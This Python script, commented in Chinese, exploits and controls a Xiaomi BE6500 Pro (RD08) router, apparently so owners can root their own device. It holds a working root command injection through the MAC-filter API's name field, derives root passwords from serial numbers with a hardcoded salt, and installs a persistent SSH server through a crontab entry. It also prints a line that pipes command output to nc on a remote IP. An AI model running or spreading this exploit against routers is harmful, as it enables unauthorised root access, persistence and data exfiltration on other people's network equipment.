#!/usr/bin/env python3
"""
小米 BE6500 Pro (RD08) 控制脚本
================================
零依赖（只用 Python 3 标准库）。

用法:
    python3 rd08.py info                     # 免认证信息（不需要密码）
    python3 rd08.py login                    # 登录，打印 stok
    python3 rd08.py rootpwd <SN>             # 从 SN 算 root 密码
    python3 rd08.py boot                     # 注入启动 dropbear（开 SSH）
    python3 rd08.py exec '<命令>'            # 通过注入执行命令（无输出）
    python3 rd08.py probe                    # 只读验证漏洞（计时法）
    python3 rd08.py devices                  # 每设备累计流量
    python3 rd08.py wifi                     # WiFi 配置（密码打码）
    python3 rd08.py wan                      # WAN 信息
    python3 rd08.py ota-off                  # 关闭自动更新
    python3 rd08.py persist                  # SSH 持久化（重启不丢）
    python3 rd08.py ssh-check                # 检查 SSH 是否可达

环境变量:
    RD08_PWD     Web 管理密码（必需，除 info/rootpwd）
    RD08_IP      路由器地址（默认 192.168.1.1）
    RD08_ROOTPW  root 密码（可选，不给就从 SN 算）
"""

import hashlib
import random
import socket
import sys
import time
import json
import urllib.request
import urllib.parse
import http.cookiejar

# ============ 固件内置常量 ============
KEY = 'a2ffa5c9be07488bbb04a3a47d3c5f6a'   # 登录加密 key（可抓包验证）
SALT = '6d2df50a-250f-4a30-a5e6-d44fb0960aa0'  # root 密码盐

IP = __import__('os').environ.get('RD08_IP', '192.168.1.1')
WEB_PWD = __import__('os').environ.get('RD08_PWD', '')
BASE = f'http://{IP}'


def sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()


def get_mac():
    """取本机第一个非 lo 网卡的 MAC 作为 deviceId"""
    import glob
    for p in sorted(glob.glob('/sys/class/net/*/address')):
        if '/lo/' in p:
            continue
        mac = open(p).read().strip()
        if mac and mac != '00:00:00:00:00:00':
            return mac
    return '00:11:22:33:44:55'


def root_password(sn):
    """从 SN 推算 root 密码（固件 mkxqimage -I 算法）"""
    return hashlib.md5((sn + SALT).encode()).hexdigest()[:8]


class Router:
    def __init__(self, ip=None):
        self.ip = ip or IP
        self.base = f'http://{self.ip}'
        self.stok = None
        cj = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    # ---------- 免认证 ----------
    def init_info(self):
        url = f'{self.base}/cgi-bin/luci/api/xqsystem/init_info'
        return json.loads(urllib.request.urlopen(url, timeout=10).read().decode())

    # ---------- 登录 ----------
    def login(self, password=None, retries=1):
        pwd = password or WEB_PWD
        if not pwd:
            raise SystemExit('错误: 需要设置 RD08_PWD 环境变量')

        for attempt in range(retries):
            nonce = '_'.join(['0', get_mac(), str(int(time.time())),
                              str(random.randint(0, 9999))])
            hashed = sha256(nonce + sha256(pwd + KEY))
            data = urllib.parse.urlencode({
                'username': 'admin', 'password': hashed,
                'logtype': '2', 'nonce': nonce,
            }).encode()
            try:
                r = json.loads(self.op.open(
                    urllib.request.Request(f'{self.base}/cgi-bin/luci/api/xqsystem/login',
                                           data=data), timeout=10).read().decode())
            except Exception as e:
                raise SystemExit(f'登录请求失败: {e}')

            if r.get('code') == 0:
                self.stok = r['token']
                return self.stok
            # 连续 4 次错误会封禁，这里直接放弃
            raise SystemExit(f'登录失败: {r}  (密码错误？注意连续 4 次会被封禁)')
        raise SystemExit('登录失败')

    # ---------- API ----------
    def api(self, path, data=None, method=None):
        if not self.stok:
            self.login()
        url = f'{self.base}/cgi-bin/luci/;stok={self.stok}/api/{path}'
        body = data.encode() if data else None
        req = urllib.request.Request(url, data=body, method=method)
        raw = self.op.open(req, timeout=20).read().decode()
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return raw

    # ---------- 命令注入 ----------
    def _rand_mac(self):
        return '0A:%02X:%02X:%02X:%02X:%02X' % tuple(
            random.randint(0, 255) for _ in range(5))

    def run(self, cmd, cleanup=True):
        """
        通过 set_macfilter_rules 的 name 参数以 root 执行命令。
        注意: 命令里不能用分号 ;（会被控制器拆分）
        返回 (耗时秒, 响应文本)
        """
        if not self.stok:
            self.login()
        mac = self._rand_mac()
        url = f'{self.base}/cgi-bin/luci/;stok={self.stok}/api/xqsystem/set_macfilter_rules'
        payload = f'x$({cmd})y'
        body = urllib.parse.urlencode({
            'mac': mac, 'name': payload, 'option': '0', 'wan': '',
        }).encode()
        t0 = time.time()
        try:
            resp = self.op.open(urllib.request.Request(url, data=body),
                                timeout=120).read().decode()
        except Exception as e:
            resp = f'ERR {e}'
        dt = round(time.time() - t0, 2)
        if cleanup:
            try:
                self.op.open(urllib.request.Request(url, data=urllib.parse.urlencode({
                    'mac': mac, 'name': '', 'option': '1', 'wan': '',
                }).encode()), timeout=30).read()
            except Exception:
                pass
        return dt, resp


# ============ 格式化助手 ============
def hbytes(b):
    try:
        b = float(b)
    except (TypeError, ValueError):
        return '-'
    for u in ('B', 'KB', 'MB', 'GB', 'TB'):
        if b < 1024:
            return f'{b:.1f}{u}'
        b /= 1024
    return f'{b:.1f}PB'


def hms(sec):
    try:
        sec = int(float(sec))
    except (TypeError, ValueError):
        return '-'
    d, h, m = sec // 86400, (sec % 86400) // 3600, (sec % 3600) // 60
    return (f'{d}天' if d else '') + f'{h}时{m}分'


def port_open(ip, port, timeout=1.5):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


# ============ 子命令 ============
def cmd_info(r):
    d = r.init_info()
    fields = [
        ('型号', 'hardware'), ('固件', 'romversion'), ('显示名', 'displayName'),
        ('内部型号', 'model'), ('SN', 'id'), ('加密模式', 'newEncryptMode'),
        ('已初始化', 'inited'), ('已绑定账号', 'bound'),
        ('Mesh 子节点', 'mesh_nodes'),
    ]
    print('=== 设备信息（免认证）===')
    for label, k in fields:
        print(f'  {label:<14} {d.get(k)}')
    if d.get('id'):
        print(f'\n  root 密码（由 SN 推算）: {root_password(d["id"])}')
    print('\n=== 端口 ===')
    for p, name in [(22, 'SSH'), (23, 'telnet'), (80, 'HTTP'),
                    (443, 'HTTPS'), (8080, 'LuCI'), (53, 'DNS')]:
        print(f'  {p:<5} {name:<8} {"OPEN" if port_open(r.ip, p) else "closed"}')


def cmd_rootpwd(sn):
    print(f'SN        : {sn}')
    print(f'root 密码 : {root_password(sn)}')


def cmd_probe(r):
    """只读验证漏洞是否可用（计时法，零痕迹）"""
    print('=== 漏洞验证（计时法，不改任何东西）===\n')
    mac = '0A:11:22:33:44:99'

    def call(data):
        url = f'{r.base}/cgi-bin/luci/;stok={r.stok}/api/xqsystem/set_macfilter_rules'
        t0 = time.time()
        try:
            r.op.open(urllib.request.Request(url, data=data.encode()),
                      timeout=60).read()
            ok = True
        except Exception:
            ok = False
        return round(time.time() - t0, 2), ok

    t1, _ = call(f'mac={mac}&name=&option=1&wan=')
    print(f'  基线(del 不存在)     : {t1:>6.2f}s')

    t2, _ = call(f'mac={mac}&name=normal&option=0&wan=')
    print(f'  基线(add 普通)       : {t2:>6.2f}s')
    call(f'mac={mac}&name=&option=1&wan=')

    print('\n  正在注入 sleep 6 ...')
    t3, _ = call(f'mac={mac}&name=x%24(sleep%206)y&option=0&wan=')
    call(f'mac={mac}&name=&option=1&wan=')
    print(f'  注入 x$(sleep 6)y    : {t3:>6.2f}s')

    print()
    if t3 - t1 > 3:
        print(f'  ✅ 漏洞可用（延迟 {t3 - t1:.1f}s ≈ 6s）')
    else:
        print(f'  ❌ 疑似已打补丁（延迟仅 {t3 - t1:.1f}s）')


def cmd_boot(r):
    """启动 dropbear（开 SSH）"""
    cmd = ('mkdir -p /etc/dropbear && '
           'rm -f /etc/dropbear/dropbear_rsa_host_key && '
           'dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key >/dev/null 2>&1 && '
           '/usr/sbin/dropbear -p 22 >/dev/null 2>&1 && echo started')
    print('=== 启动 dropbear ===')
    dt, resp = r.run(cmd)
    print(f'  耗时: {dt}s   响应: {resp}')
    time.sleep(2)
    if port_open(r.ip, 22):
        info = r.init_info()
        print(f'  ✅ 22 端口已开放')
        print(f'  root 密码: {root_password(info.get("id", ""))}')
        print(f'\n  登录:')
        print(f'    ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \\')
        print(f'        root@{r.ip}')
    else:
        print('  ❌ 22 端口未开放，检查注入是否成功')


def cmd_devices(r):
    st = r.api('xqsystem/status')
    ws = st.get('wanStatistics', {})
    print('=== 整机 WAN ===')
    print(f'  下行: {hbytes(ws.get("download", 0))}   上行: {hbytes(ws.get("upload", 0))}')
    print(f'  运行: {hms(st.get("upTime", 0))}')
    print(f'\n{"设备":<28}{"↓累计":>11}{"↑累计":>11}{"占用":>8}')
    print('-' * 60)
    rows = sorted(st.get('devStatistics', []),
                  key=lambda x: -float(x.get('download', 0) or 0))
    for d in rows:
        print(f'{str(d.get("devname", "-"))[:26]:<28}'
              f'{hbytes(d.get("download", 0)):>11}'
              f'{hbytes(d.get("upload", 0)):>11}'
              f'{hbytes(int(float(d.get("download", 0) or 0) - float(d.get("upload", 0) or 0))):>8}')


def cmd_wifi(r):
    d = r.api('xqnetwork/wifi_detail_all')
    print('=== 无线 ===')
    print(f'{"接口":<8}{"SSID":<26}{"信道":<6}{"模式":<8}{"加密":<10}密码')
    print('-' * 74)
    for i in d.get('info', []):
        ch = i.get('channelInfo', {}).get('channel', i.get('channel', '-'))
        pw = i.get('password', '')
        print(f'{str(i.get("ifname", "-")):<8}'
              f'{str(i.get("ssid", "-"))[:24]:<26}'
              f'{str(ch):<6}{str(i.get("wifimode", "-")):<8}'
              f'{str(i.get("encryption", "-")):<10}'
              f'{"*" * len(pw) if pw else "(无)"}')


def cmd_wan(r):
    d = r.api('xqnetwork/wan_info').get('info', {})
    print('=== WAN ===')
    print(f'  类型    : {d.get("details", {}).get("wanType")}')
    for ip in d.get('ipv4', []):
        print(f'  IP      : {ip.get("ip")}/{ip.get("mask")}')
    print(f'  网关    : {d.get("gateWay")}')
    print(f'  接口    : {d.get("details", {}).get("ifname")}')
    print(f'  DNS     : {d.get("dnsAddrs")}, {d.get("dnsAddrs1")}')
    print(f'  在线    : {hms(d.get("uptime", 0))}')
    ipv6 = d.get('ipv6_info', {})
    print(f'  IPv6    : mode={ipv6.get("ipv6_mode")} up={ipv6.get("up")}')


def cmd_ota_off(r):
    print('=== 关闭自动更新 ===')
    dt, resp = r.run('uci set otapred.settings.auto=0 && uci commit otapred && echo ok')
    print(f'  UCI 开关: {dt}s {resp}')

    dt, resp = r.run(
        'cp /etc/crontabs/root /data/crontab.backup.$(date +%Y%m%d-%H%M%S) && '
        'sed -i "/otapredownload/d" /etc/crontabs/root && '
        'killall crond; sleep 1; /usr/sbin/crond -c /etc/crontabs -b; '
        'echo done')
    print(f'  crontab : {dt}s {resp}')
    print('\n  验证（需 SSH）:')
    print('    uci get otapred.settings.auto              # 0')
    print('    grep -c otapredownload /etc/crontabs/root  # 0')


def cmd_persist(r):
    """SSH 持久化：hostkey 放 /data，crontab 每分钟检查并拉起 dropbear"""
    print('=== SSH 持久化 ===\n')

    # 分步执行，每步单独确认，避免 && 链短路后看不出来
    steps = [
        ('创建 /data/ssh', 'mkdir -p /data/ssh && echo ok'),
        ('固化 hostkey',
         'cp /etc/dropbear/dropbear_rsa_host_key /data/ssh/host_key && '
         'chmod 600 /data/ssh/host_key && echo ok'),
    ]

    # boot.sh 用 base64 传输，避免引号和转义问题
    bootsh = (
        '#!/bin/sh\n'
        'mkdir -p /etc/dropbear\n'
        '[ -s /etc/dropbear/dropbear_rsa_host_key ] || '
        'cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key\n'
        'chmod 600 /etc/dropbear/dropbear_rsa_host_key\n'
        "netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22\n"
    )
    import base64
    b64 = base64.b64encode(bootsh.encode()).decode()
    steps.append(('写入 boot.sh',
                  f"echo '{b64}' | base64 -d > /data/ssh/boot.sh && "
                  f'chmod 755 /data/ssh/boot.sh && echo ok'))
    # 注意：载荷里不能用分号 ;（会被控制器拆掉），只能用 && 和 ||
    steps.append(('追加 crontab',
                  'grep -q "/data/ssh/boot.sh" /etc/crontabs/root '
                  '|| echo "* * * * * /data/ssh/boot.sh" >> /etc/crontabs/root'))
    steps.append(('重启 cron',
                  '(killall crond 2>/dev/null || true) && '
                  'sleep 1 && (/usr/sbin/crond -c /etc/crontabs -b 2>/dev/null || true) && '
                  'sleep 1 && echo restarted'))

    for label, cmd in steps:
        dt, resp = r.run(cmd)
        print(f'  {label:<16} {dt:>5.2f}s  {resp}')

    print('\n  验证（需 SSH）:')
    print('    ls -la /data/ssh/')
    print('    tail -1 /etc/crontabs/root')
    print('\n  模拟重启测试:')
    print(f'    ssh root@{r.ip} "killall dropbear"    # 等约 1 分钟应自动恢复')


def cmd_exec(r, command):
    dt, resp = r.run(command)
    print(f'[{dt}s] {resp}')
    if resp.strip() != '{"code":0}':
        return
    print(f'\n✅ 命令已执行（耗时 {dt}s）。注入本身不返回 stdout。')
    if ';' in command:
        print('\n⚠️ 警告: 命令含分号 ; —— 会被控制器拆掉，分号后的部分不执行！')
        print('   串联命令请用 && 或 ||')
    print('\n要拿到输出，写文件再从 SSH 读:')
    print(f"  python3 rd08.py exec '{command} > /tmp/out.txt 2>&1'")
    print("  ssh root@%s 'cat /tmp/out.txt'" % r.ip)
    print('\n或用反向连接回传（{ } 包成块，别用分号分隔）:')
    print(f"  python3 rd08.py exec '{{ {command} ; }} | nc <你的IP> 9999'".replace(' ; ', ' '))


def cmd_ssh_check(r):
    print(f'=== SSH 状态 ({r.ip}) ===')
    ok = port_open(r.ip, 22)
    print(f'  22 端口: {"OPEN" if ok else "CLOSED"}')
    if not ok:
        print('\n  SSH 未开启。启动方法:')
        print('    python3 rd08.py boot')


# ============ 入口 ============
USAGE = __doc__


def main():
    if len(sys.argv) < 2:
        print(USAGE)
        return 1

    action = sys.argv[1]
    arg = sys.argv[2] if len(sys.argv) > 2 else None

    # 不需要登录的命令
    if action == 'rootpwd':
        if not arg:
            print('用法: rd08.py rootpwd <SN>')
            return 1
        cmd_rootpwd(arg)
        return 0

    r = Router()

    if action == 'info':
        cmd_info(r)
    elif action == 'ssh-check':
        cmd_ssh_check(r)
    elif action == 'login':
        print('stok =', r.login())
    elif action == 'probe':
        r.login()
        cmd_probe(r)
    elif action == 'boot':
        r.login()
        cmd_boot(r)
    elif action == 'exec':
        if not arg:
            print("用法: rd08.py exec '<命令>'")
            return 1
        r.login()
        cmd_exec(r, arg)
    elif action == 'devices':
        r.login()
        cmd_devices(r)
    elif action == 'wifi':
        r.login()
        cmd_wifi(r)
    elif action == 'wan':
        r.login()
        cmd_wan(r)
    elif action == 'ota-off':
        r.login()
        cmd_ota_off(r)
    elif action == 'persist':
        r.login()
        cmd_persist(r)
    else:
        print(USAGE)
        return 1
    return 0


if __name__ == '__main__':
    sys.exit(main())
